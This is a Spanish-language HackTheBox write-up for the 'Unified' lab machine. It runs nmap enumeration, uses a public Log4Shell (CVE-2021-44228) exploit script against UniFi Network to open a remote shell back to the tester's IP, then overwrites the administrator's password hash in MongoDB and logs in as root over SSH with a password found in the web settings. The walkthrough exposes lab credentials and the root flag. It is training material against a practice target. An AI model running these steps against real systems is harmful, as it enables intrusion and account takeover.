# Unified

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 29 de diciembre de 2024 20:52
IP: 10.129.164.42

## Recopilación de información

<aside>
💡 Escaneo inicial de puertos

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open --min-rate 5000 -sS -Pn -vvv 10.129.164.42 -oG allports
```

![image.png](<imagenes/image 66.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p22,6789,8080,8443,8843,8880 -sCV 10.129.164.42 -oN targeted
```

- **Identificación de vulnerabilidades**
    - **22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)**
    - **6789/tcp open  ibm-db2-admin?**
    - **8080/tcp open  http-proxy**
        
        ```bash
        http-title: Did not follow redirect to https://10.129.164.42:8443/manage
        |_http-open-proxy: Proxy might be redirecting requests
        | fingerprint-strings: 
        |   FourOhFourRequest: 
        |     HTTP/1.1 404 
        |     Content-Type: text/html;charset=utf-8
        |     Content-Language: en
        |     Content-Length: 431
        |     Date: Sun, 29 Dec 2024 20:06:45 GMT
        |     Connection: close
        |     <!doctype html><html lang="en"><head><title>HTTP Status 404 
        |     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
        |     Found</h1></body></html>
        |   GetRequest, HTTPOptions: 
        |     HTTP/1.1 302 
        |     Location: http://localhost:8080/manage
        |     Content-Length: 0
        |     Date: Sun, 29 Dec 2024 20:06:45 GMT
        |     Connection: close
        |   RTSPRequest, Socks5: 
        |     HTTP/1.1 400 
        |     Content-Type: text/html;charset=utf-8
        |     Content-Language: en
        |     Content-Length: 435
        |     Date: Sun, 29 Dec 2024 20:06:45 GMT
        |     Connection: close
        |     <!doctype html><html lang="en"><head><title>HTTP Status 400 
        |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
        |_    Request</h1></body></html>
        ```
        
    - **8443/tcp open  ssl/nagios-nsca Nagios NSCA**
        
        ```bash
        ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
        | Subject Alternative Name: DNS:UniFi
        | Not valid before: 2021-12-30T21:37:24
        |_Not valid after:  2024-04-03T21:37:24
        | http-title: UniFi Network
        |_Requested resource was /manage/account/login?redirect=%2Fmanage
        ```
        
    - **8843/tcp open  ssl/unknown**
        
        ```bash
        ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
        | Subject Alternative Name: DNS:UniFi
        | Not valid before: 2021-12-30T21:37:24
        |_Not valid after:  2024-04-03T21:37:24
        | fingerprint-strings: 
        |   GetRequest, HTTPOptions, RTSPRequest: 
        |     HTTP/1.1 400 
        |     Content-Type: text/html;charset=utf-8
        |     Content-Language: en
        |     Content-Length: 435
        |     Date: Sun, 29 Dec 2024 20:07:03 GMT
        |     Connection: close
        |     <!doctype html><html lang="en"><head><title>HTTP Status 400 
        |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
        |_    Request</h1></body></html>
        ```
        
    - **8880/tcp open  cddbp-alt?**
        
        ```bash
        fingerprint-strings: 
        |   FourOhFourRequest: 
        |     HTTP/1.1 404 
        |     Content-Type: text/html;charset=utf-8
        |     Content-Language: en
        |     Content-Length: 431
        |     Date: Sun, 29 Dec 2024 20:06:46 GMT
        |     Connection: close
        |     <!doctype html><html lang="en"><head><title>HTTP Status 404 
        |     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
        |     Found</h1></body></html>
        |   GetRequest: 
        |     HTTP/1.1 400 
        |     Content-Type: text/html;charset=utf-8
        |     Content-Language: en
        |     Content-Length: 435
        |     Date: Sun, 29 Dec 2024 20:06:45 GMT
        |     Connection: close
        |     <!doctype html><html lang="en"><head><title>HTTP Status 400 
        |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
        |     Request</h1></body></html>
        |   HTTPOptions: 
        |     HTTP/1.1 400 
        |     Content-Type: text/html;charset=utf-8
        |     Content-Language: en
        |     Content-Length: 435
        |     Date: Sun, 29 Dec 2024 20:06:51 GMT
        |     Connection: close
        |     <!doctype html><html lang="en"><head><title>HTTP Status 400 
        |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
        |_    Request</h1></body></html>
        ```
        
    

## Explotación

<aside>
💡

</aside>

### Explotación 1

Vemos que el puerto 8443 corre el software UniFi Network que es vunerable  a : 

**CVE-2021-44228**

Buscamos el exploit :

[https://github.com/puzzlepeaches/Log4jUnifi](https://github.com/puzzlepeaches/Log4jUnifi)

Ejecutando el xploit tenemos RCE en la maquina haciendo :

```bash
❯ python3 exploit.py -u https://10.129.164.42:8443 -i 10.10.14.208 -p 4443
```

Una vez nos conectamos , enumeramos la base de datos mongo, para cambiar el password de administrador y poder acceder via web:

Opciones dentro de mongo

```bash

show dbs # Muestra las bases de datos
use db # selecciona la base de datos para trabajar
show collections # Muestra contenido de la bd (ex:admin,config)
db.admin.find() # Muestra contenido de la tabla
```

Podemos ver el contenido igualmente haciendo:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Para cambiar el password por uno nuevo, hacemos:

```bash
mkpasswd -m sha-512 test123

# Genera un password con el mismo formato
# Si identificamos el hash ($6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.) nos dice que es un SHA-512

$6$ZodQMsUBsAjSApZ4$SVQpJGZOC3v2XeFIezGrXLvSfxd2RoZpgaODN7cKpxYtQELjZaOZKEiGwiT8KpuYf3EsfV3e7D7GGqPfI49rt.
```

Para actualizar el password en mongo:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$ZodQMsUBsAjSApZ4$SVQpJGZOC3v2XeFIezGrXLvSfxd2RoZpgaODN7cKpxYtQELjZaOZKEiGwiT8KpuYf3EsfV3e7D7GGqPfI49rt."}})'
```

Para verificar que se ha cambiado el password:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
	"name" : "administrator",
	"email" : "administrator@unified.htb",
	"x_shadow" : "$6$ZodQMsUBsAjSApZ4$SVQpJGZOC3v2XeFIezGrXLvSfxd2RoZpgaODN7cKpxYtQELjZaOZKEiGwiT8KpuYf3EsfV3e7D7GGqPfI49rt.",
	"time_created" : NumberLong(1640900495),
	"last_site_name" : "default",
	"ui_settings" : {
		"neverCheckForUpdate" : true,
		"statisticsPrefferedTZ" : "SITE",
		"statisticsPreferBps" : "",
		"tables" : {
		
 # Aparece el nuevo password
```

Con el nuevo password, probamos a logarnos en la web. 

En la parte de configuracion, vemos el password para acceder por ssh como root;

![image.png](<imagenes/image 67.png>)

Password:  **NotACrackablePassword4U2022**

### Explotación 2

Accedermos por SSH con el password de root: 

```bash
ssh root@10.129.164.42
The authenticity of host '10.129.164.42 (10.129.164.42)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.164.42' (ED25519) to the list of known hosts.
root@10.129.164.42's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

root@unified:~# ls
root.txt
root@unified:~# cd    
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
```

### Explotación 3

## Explotación posterior

<aside>
💡 No tuvimos que escalar privilegios ya que se nos facilita en la web el usuario root para acceder por SSH

</aside>

### Escalada de privilegios

## Conclusión

<aside>
💡 Maquina que no he podido resolver solo por falta de conocimientos de MongoDB

</aside>